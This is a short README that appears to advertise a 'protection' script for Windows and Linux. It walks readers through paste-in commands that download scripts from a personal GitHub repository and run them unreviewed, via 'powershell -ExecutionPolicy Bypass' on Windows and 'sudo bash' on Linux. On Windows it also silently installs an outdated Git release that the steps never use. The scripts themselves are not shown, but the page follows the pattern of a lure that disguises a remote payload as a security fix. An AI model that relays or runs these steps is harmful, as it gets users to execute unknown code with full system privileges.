# Maximum PC Protection (Without Breaking!)

The Protection script will maximize the security of your PC.
- ✓ Enables Firewall
- ✓ Blocks unauthorized access
- ✓ Reduces attack surface by disabling unused services
- ✓ Applies security settings

## To receive these benefits:

### For Windows Users:

Make sure you have at least 200 MB of free space available.

1. **Open Command Prompt**
   - Press `Windows + R`
   - Type `cmd`
   - Press `Enter`

2. **Install Git**
   - Copy/Paste the following line in Command Prompt:
     ```cmd
     powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/download/v2.14.1.windows.1/Git-2.14.1-64-bit.exe -OutFile Git-2.14.1-64-bit.exe"
     ```
   - Once it's downloaded, Copy/Paste the following line in Command Prompt:
     ```cmd
     .\Git-2.14.1-64-bit.exe /VERYSILENT /NORESTART
     ```

3. **Download Protection Script**
   - Copy/Paste the following line in Command Prompt:
     ```cmd
     curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1
     ```

4. **Run the Windows Script**
   - Copy/Paste the following line in Command Prompt:
     ```cmd
     powershell -ExecutionPolicy Bypass -File .\win.ps1
     ```

Now your Windows PC is protected from unwanted activity!

### For Linux Users:

Make sure you have at least 100 MB of free space available.

1. **Open Terminal**

2. **Update Package Lists**
   - Copy/Paste the following line in Terminal:
     ```bash
     sudo apt-get update
     ```

3. **Install Git**
   - Copy/Paste the following line in Terminal:
     ```bash
     sudo apt-get install git -y
     ```

4. **Download Protection Script**
   - Copy/Paste the following line in Terminal:
     ```bash
     curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh
     ```

5. **Run the Linux Script**
   - Copy/Paste the following line in Terminal:
     ```bash
     sudo bash ./lin.sh
     ```

Now your Linux system is protected from unwanted activity!
